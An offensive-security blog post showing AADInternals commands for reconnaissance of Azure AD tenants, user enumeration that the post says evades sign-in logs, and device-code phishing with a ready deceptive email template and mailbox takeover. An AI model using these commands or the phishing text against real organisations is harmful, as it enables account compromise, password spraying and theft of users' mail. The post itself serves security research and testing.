+++
title = "Just looking: Azure Active Directory reconnaissance as an outsider"
date = "2020-06-13"
lastmod = "2021-09-01"
categories =["blog"]
tags = ["Azure Active Directory","Azure","reconnaissance","recon","security","outsider"]
thumbnail = "/images/posts/justlooking.png"
+++

This post is part 1/5 of <a href="/aadkillchain/" target="_blank">Azure AD and Microsoft 365 kill chain</a> blog series.

Azure AD and Office 365 are cloud services and most information is available only to the members (or guests) of the tenant.
However, there are plenty of information publicly available to anyone. 

In this blog, using **AADInternals v0.4.0**, I'll show how to gather information of any Azure AD tenant as an outsider. 

<!--more-->
# Azure AD reconnaissance
There are several publicly available APIs which will expose information of any Azure AD tenant:

API                                                                    | Information                                                                           | AADInternals function
--- | --- | ---
login.microsoftonline.com/&lt;domain>/.well-known/openid-configuration | Login information, including tenant ID                                                | Get-AADIntTenantID -Domain &lt;domain>
autodiscover-s.outlook.com/autodiscover/autodiscover.svc               | All domains of the tenant                                                             | Get-AADIntTenantDomains -Domain &lt;domain>
login.microsoftonline.com/GetUserRealm.srf?login=&lt;UserName>         | Login information of the tenant, including tenant Name and domain authentication type | Get-AADIntLoginInformation -UserName &lt;UserName>
login.microsoftonline.com/common/GetCredentialType                     | Login information, including Desktop SSO information                                  | Get-AADIntLoginInformation -UserName &lt;UserName>

Some information is also available from DNS:

Record | Information | PowerShell cmdlet
--- | --- | ---
MX | Is the domain accepting mail to EXO (contains mail.protection.outlook.com) | Resolve-DnsName -Name &lt;domain> -Type MX
TXT | Is the domain sending mail from EXO (SPF contains include:spf.protection.outlook.com) | Resolve-DnsName -Name &lt;domain> -Type TXT

All the above mentioned information can be easily gathered with AADInternals:

{{< highlight powershell >}}
# Invoke reconnaissance
Invoke-AADIntReconAsOutsider -DomainName company.com | Format-Table
{{< /highlight>}}
Output:
```
Tenant brand:       Company Ltd
Tenant name:        company
Tenant id:          05aea22e-32f3-4c35-831b-52735704feb3
DesktopSSO enabled: True

Name                           DNS   MX    SPF  Type      STS
----                           ---   --    ---  ----      ---
company.com                   True  True  True  Federated sts.company.com
company.mail.onmicrosoft.com  True  True  True  Managed
company.onmicrosoft.com       True  True  True  Managed
int.company.com              False False False  Managed
```
From the output we can see the tenant information of the target organisation, including the tenant name, id and the "brand" name. We can also see whether the Desktop SSO (aka <a href="https://docs.microsoft.com/en-us/azure/active-directory/hybrid/how-to-connect-sso" target="_blank">Seamless SSO</a>) is enabled.
If enabled, we can find out whether a given user exists in the target organisation or not (user enumeration).

We can also see the names of all (verified) domains and their identity types of the target tenant. For federated domains, the FQDN of the used identity provider (usually ADFS server) is also shown. 
The MX column indicates whether the email is send to Exchange online or not. The SPF column indicates whether Exchange online is listed as an email sender. 
**Note!** Currently the recon function does not follow the include statements of SPF records, so there can be false-negatives.

# User enumeration
We can use the GetCredentialType API mentioned above to check <a href="/post/desktopsso/" target="_blank">does the user exists</a> in Azure AD. 

This includes also guest users, whose username is in the format: 
``` 
<email>#EXT#@<tenant name>.onmicrosoft.com
```
The email is user's email address where at "@" is replaced with underscore "_".

With AADInternals, you can easily check does the user exists or not:

{{< highlight powershell >}}
# Check does the user exist
Invoke-AADIntUserEnumerationAsOutsider -UserName "user@company.com"
{{< /highlight>}}
Output:
```
UserName         Exists
--------         ------
user@company.com True
```
You can also use a text file containing one email address per row:
```
user@company.com
user2@company.com
admin@company.com
admin2@company.com
external.user_gmail.com#EXT#@company.onmicrosoft.com
external.user_outlook.com#EXT#@company.onmicrosoft.com
```

{{< highlight powershell >}}
# Invoke user enumeration
Get-Content .\users.txt | Invoke-AADIntUserEnumerationAsOutsider -Method Normal
{{< /highlight>}}
Output:
```
UserName                                               Exists
--------                                               ------
user@company.com                                       True
user2@company.com                                      False
admin@company.com                                      True
admin2@company.com                                     False
external.user_gmail.com#EXT#@company.onmicrosoft.com   True
external.user_outlook.com#EXT#@company.onmicrosoft.com False
```

There are three different enumeration methods to choose from:

Method    | Description
---       | ---
Normal    | This refers to the GetCredentialType API mentioned above. The default method. 
Login     | This method tries to log in as the user. <br> **Note:** queries will be logged to sign-ins log.
Autologon | This method tries to log in as the user via autologon endpoint. <br> **Queries are not logged** to sign-ins log! As such, works well also for password spray and brute-force attacks.

# Phishing

Phishing refers to various techniques for compromising users' identities. Typically this involves building a phishing infrastructure, e.g., setting up fake login sites or Azure apps.
This may require a lot of work, depending on the chosen technique.

The Azure <a href="/post/phishing" target="_blank">device code authentication</a> flow can be used for phishing without a need for setting up any separate phishing infrastructure.

AADInternals can be used to <a href="/post/phishing/#email" target="_blank">send phishing emails</a> to one or more recipients. If the user clicks the link and "accepts" the authentication within 15 minutes, the user's identity is compromised:

{{< highlight powershell >}}
# Send a phishing email to recipients using customised message and save the tokens to cache
$message = 'Dear recipient, <br> Your Microsoft account has been compromised. Login at <a href="{1}">https://microsoft.com</a> to reset your password. <br> Use the following security code: <b>{0}</b>.' 
Invoke-AADIntPhishing -Recipients "wvictim@company.com","wvictim2@company.com" -Subject "Your Microsoft account is compromised - Actions required." -Sender "Johnny Carson <jc@somewhere.com>" -SMTPServer smtp.myserver.local -Message $message -SaveToCache
{{< /highlight>}}

```
Code: CKDZ2BURF
Mail sent to: wvictim@company.com
Mail sent to: wvictim2@company.com
...
Received access token for william.victim@company.com
```
After receiving the access tokens, the attacker can now perform everything an <a href="/post/insider" target="_blank">insider</a> can do.

For instance, easiest way to access user's mailbox is to open OWA as the victim:
{{< highlight powershell >}}
# Open OWA as the victim
Open-AADIntOWA
{{< /highlight>}}

This opens OWA in pop-up window:

![OWA](/images/posts/justlooking2.png)

# Summary
The publicly available APIs and DNS records can be easily used to gather information about the target organisations.

There are also multiple methods for user enumeration to choose from.

Device code authentication flow phishing is an easy way to compromise victim's identity.

**Tip:** To hide your on-coming new products from the public, do not register and verify the corresponding domain names to Azure AD!